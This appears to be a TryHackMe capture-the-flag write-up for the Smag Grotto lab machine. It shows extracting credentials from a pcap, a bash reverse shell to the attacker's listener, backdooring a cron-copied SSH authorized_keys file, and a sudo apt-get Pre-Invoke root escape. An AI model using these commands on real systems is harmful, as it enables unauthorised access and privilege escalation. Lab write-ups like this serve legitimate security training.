# Smag Grott Tryhackme Writeup

http://10.10.229.183/mail/ In this page download dHJhY2Uy.pcap file


wireshark dHJhY2Uy.pcap it gives vhost and creds

	development.smag.thm

	username=helpdesk&password=cH4nG3M3_n0w

after login it asks for enter cammand.

bash -c "bash -i >& /dev/tcp/10.9.172.114/9001 0>&1"

check ur NC!

```bash
┌──(arundhanush㉿kali)-[~]
└─$ nc -nlvp 9001 
Listening on 0.0.0.0 9001
Connection received on 10.10.229.183 33012
bash: cannot set terminal process group (723): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$
```

## www-data to user

check crontab

```bash
www-data@smag:/home/jake$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#

```

crontab copy's some file to jake .ssh

nano /opt/.backups/jake_id_rsa.pub.backup

--------copy paste ur authorized keys--------

```bash
┌──(arundhanush㉿kali)-[~/.ssh]
└─$ ssh -i id_rsa jake@10.10.229.183                                      130 ⨯
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$
```

## Privesc

```bash
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root
```